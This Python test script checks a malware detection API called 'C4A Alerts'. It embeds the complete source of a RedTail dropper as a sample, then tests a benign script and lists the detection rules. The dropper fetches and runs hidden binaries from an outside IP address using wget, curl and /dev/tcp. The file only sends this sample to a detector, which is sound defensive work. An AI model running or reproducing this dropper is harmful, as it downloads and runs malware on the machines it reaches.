#!/usr/bin/env python3
"""
Test script for malware detection system.

This script demonstrates how the C4A Alerts malware detection system
can identify and analyze malicious scripts like the RedTail dropper.
"""

import requests
import json
from typing import Dict, Any

# Configuration
API_BASE_URL = "http://localhost:8000"
MALWARE_ENDPOINT = f"{API_BASE_URL}/api/v1/malware"

# The RedTail malware script we analyzed
REDTAIL_MALWARE = '''#!/bin/bash

dlr() {
  rm -rf $1
  wget http://107.150.0.103/$1 || curl -O http://107.150.0.103/$1
  if [ $? -ne 0 ]; then
    exec 3<>"/dev/tcp/107.150.0.103/80"
    echo -e "GET /$1 HTTP/1.0\r\nHost: 107.150.0.103\r\n\r\n" >&3
    (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 >$1
    exec 3>&-
  fi
}

NOEXEC_DIRS=$(cat /proc/mounts | grep 'noexec' | awk '{print $2}')
EXCLUDE=""

for dir in $NOEXEC_DIRS; do
  EXCLUDE="${EXCLUDE} -not -path \"$dir\" -not -path \"$dir/*\""
done

FOLDERS=$(eval find / -type d -user $(whoami) -perm -u=rwx -not -path \"/tmp/*\" -not -path \"/proc/*\" $EXCLUDE 2>/dev/null)
ARCH=$(uname -mp)
OK=true

for i in $FOLDERS /tmp /var/tmp /dev/shm; do
  if cd "$i" && touch .testfile && (dd if=/dev/zero of=.testfile2 bs=2M count=1 >/dev/null 2>&1 || truncate -s 2M .testfile2 >/dev/null 2>&1); then
    rm -rf .testfile .testfile2
    break
  fi
done

dlr clean
chmod +x clean
sh clean >/dev/null 2>&1
rm -rf clean

rm -rf .redtail
if echo "$ARCH" | grep -q "x86_64" || echo "$ARCH" | grep -q "amd64"; then
  dlr x86_64
  mv x86_64 .redtail
elif echo "$ARCH" | grep -q "i[3456]86"; then
  dlr i686
  mv i686 .redtail
elif echo "$ARCH" | grep -q "armv8" || echo "$ARCH" | grep -q "aarch64"; then
  dlr aarch64
  mv aarch64 .redtail
elif echo "$ARCH" | grep -q "armv7"; then
  dlr arm7
  mv arm7 .redtail
else
  OK=false
  for a in x86_64 i686 aarch64 arm7; do
    dlr $a
    cat $a >.redtail
    chmod +x .redtail
    ./.redtail $1 >/dev/null 2>&1
    rm -rf $a
  done
fi

if [ $OK = true ]; then
  chmod +x .redtail
  ./.redtail $1 >/dev/null 2>&1
fi
'''

def test_malware_detection() -> None:
    """Test the malware detection system with the RedTail script."""
    print("🔍 Testing C4A Alerts Malware Detection System")
    print("=" * 60)

    # Test 1: Analyze the RedTail malware
    print("\n📋 Test 1: Analyzing RedTail Malware Script")
    print("-" * 40)

    try:
        response = requests.post(
            f"{MALWARE_ENDPOINT}/test",
            json={"content": REDTAIL_MALWARE},
            headers={"Content-Type": "application/json"}
        )

        if response.status_code == 200:
            result = response.json()
            print("✅ Analysis completed successfully!")
            print(f"📊 Detection Summary:")
            print(f"   - Malware Detected: {result['detection_summary']['malware_detected']}")
            print(f"   - Malware Family: {result['detection_summary']['malware_family']}")
            print(f"   - Severity: {result['detection_summary']['severity']}")
            print(f"   - Confidence: {result['detection_summary']['confidence']:.2f}")
            print(f"   - Rules Triggered: {result['detection_summary']['rules_triggered']}")
            print(f"   - Evasion Techniques: {result['detection_summary']['evasion_techniques']}")
            print(f"   - Suspicious Commands: {result['detection_summary']['suspicious_commands']}")

            # Show detailed analysis
            analysis = result['analysis_results']
            if analysis['detection_rules']:
                print(f"\n🚨 Detection Rules Triggered:")
                for rule in analysis['detection_rules']:
                    print(f"   - {rule}")

            if analysis['evasion_techniques']:
                print(f"\n🛡️ Evasion Techniques Detected:")
                for technique in analysis['evasion_techniques']:
                    print(f"   - {technique}")

            if analysis['recommended_actions']:
                print(f"\n💡 Recommended Actions:")
                for action in analysis['recommended_actions'][:5]:  # Show first 5
                    print(f"   - {action}")
        else:
            print(f"❌ Error: {response.status_code} - {response.text}")

    except requests.exceptions.ConnectionError:
        print("❌ Error: Cannot connect to C4A Alerts API. Make sure the server is running.")
        print("   Run: python -m uvicorn c4aalerts.app.api.main:app --reload --host 0.0.0.0 --port 8000")
        return
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        return

def test_benign_script() -> None:
    """Test with a benign script to ensure no false positives."""
    print("\n📋 Test 2: Analyzing Benign Script")
    print("-" * 40)

    benign_script = '''#!/bin/bash
# This is a benign script for testing
echo "Hello World"
echo "Current date: $(date)"
echo "System info: $(uname -a)"
echo "Disk usage: $(df -h)"
'''

    try:
        response = requests.post(
            f"{MALWARE_ENDPOINT}/test",
            json={"content": benign_script},
            headers={"Content-Type": "application/json"}
        )

        if response.status_code == 200:
            result = response.json()
            print("✅ Analysis completed successfully!")
            print(f"📊 Detection Summary:")
            print(f"   - Malware Detected: {result['detection_summary']['malware_detected']}")
            print(f"   - Confidence: {result['detection_summary']['confidence']:.2f}")
            print(f"   - Rules Triggered: {result['detection_summary']['rules_triggered']}")

            if not result['detection_summary']['malware_detected']:
                print("✅ No false positives detected - Good!")
            else:
                print("⚠️  False positive detected - needs tuning")
        else:
            print(f"❌ Error: {response.status_code} - {response.text}")

    except Exception as e:
        print(f"❌ Error: {str(e)}")

def get_detection_rules() -> None:
    """Get information about available detection rules."""
    print("\n📋 Test 3: Available Detection Rules")
    print("-" * 40)

    try:
        response = requests.get(f"{MALWARE_ENDPOINT}/rules")

        if response.status_code == 200:
            result = response.json()
            print(f"✅ Found {result['total_rules']} detection rules:")

            for rule in result['rules']:
                print(f"\n🔍 Rule: {rule['name']}")
                print(f"   Description: {rule['description']}")
                print(f"   Severity: {rule['severity']}")
                print(f"   Confidence: {rule['confidence']}")
                print(f"   Techniques: {', '.join(rule['techniques'])}")
                print(f"   Tags: {', '.join(rule['tags'])}")
        else:
            print(f"❌ Error: {response.status_code} - {response.text}")

    except Exception as e:
        print(f"❌ Error: {str(e)}")

def main() -> None:
    """Main test function."""
    print("🚀 C4A Alerts - Malware Detection System Test")
    print("=" * 60)

    # Test malware detection
    test_malware_detection()

    # Test benign script
    test_benign_script()

    # Get detection rules
    get_detection_rules()

    print("\n" + "=" * 60)
    print("✅ Testing completed!")
    print("\n💡 Next steps:")
    print("   1. Review the detection results")
    print("   2. Adjust detection rules if needed")
    print("   3. Integrate with your security monitoring")
    print("   4. Set up automated alerts for detected malware")

if __name__ == "__main__":
    main()
